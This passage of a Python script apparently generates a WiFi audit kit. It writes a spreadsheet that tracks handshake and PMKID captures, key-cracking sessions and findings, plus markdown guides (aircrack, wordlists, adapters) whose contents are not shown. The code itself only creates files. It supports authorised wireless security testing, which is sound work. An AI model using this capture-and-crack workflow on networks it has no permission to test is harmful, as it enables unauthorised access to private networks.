    dv = DataValidation(type="list", formula1='"Required,Optional,Disabled,Unknown"', allow_blank=True)
    ws2.add_data_validation(dv)
    dv.add("F2:F500")
    auto_w(ws2)

    # Captures
    ws3 = wb.create_sheet("Captures")
    for col, h in enumerate(["Timestamp", "BSSID", "Channel", "Command", "Pcap File", "Handshake?", "PMKID?", "Notes"], 1):
        ws3.cell(1, col, h)
    style_header(ws3)
    auto_w(ws3)

    # Cracking
    ws4 = wb.create_sheet("Cracking")
    for col, h in enumerate(["Session", "Start", "BSSID", "Rule File", "Wordlist/Mask", "Status", "Key", "Speed", "Notes"], 1):
        ws4.cell(1, col, h)
    style_header(ws4)
    dv2 = DataValidation(type="list", formula1='"Running,Paused,Exhausted,Cracked"', allow_blank=True)
    ws4.add_data_validation(dv2)
    dv2.add("F2:F500")
    auto_w(ws4)

    # Findings
    ws5 = wb.create_sheet("Findings")
    for col, h in enumerate(["ID", "Severity", "Target", "Description", "Evidence", "Recommendation", "Status"], 1):
        ws5.cell(1, col, h)
    style_header(ws5)
    auto_w(ws5)

    wb.save(base / "WIFI_AUDIT_TRACKER.xlsx")
    print(f"{LOG_OK}WIFI_AUDIT_TRACKER.xlsx written")

def write_files(base: Path) -> None:
    files = {
        "README.md": get_readme(),
        "MASTER_CHECKLIST.md": get_master_checklist(),
        "AIRCRACK_MANUAL.md": get_aircrack_manual_exact(),
        "WORDLIST_UTILS.md": get_wordlist_utils_exact(),
        "SUPPLEMENTAL.md": get_supplemental_exact(),
        "ADAPTER_SETUP.md": get_adapter_exact(),
        "KISMET.md": get_kismet_exact(),
        "TOOLS_RESOURCES.md": get_tools(),
    }
    for name, content in files.items():
        path = base / name
        path.write_text(content + "\n", encoding="utf-8")
        print(f"{LOG_SUB}{name}")

def main() -> None:
    args = parse_args()
    print(f"\n[ WiFi Audit Kit | {APP_VERSION} ]\n")
    base = resolve_name(args.name)
    create_structure(base, args.force)
    write_files(base)
    if not args.no_spreadsheet:
        create_spreadsheet(base)
    print(f"\n{LOG_OK}Done → {base.resolve()}")
    print(f"{LOG_OK}Open README.md + MASTER_CHECKLIST.md + WIFI_AUDIT_TRACKER.xlsx")

if __name__ == "__main__":
    main()
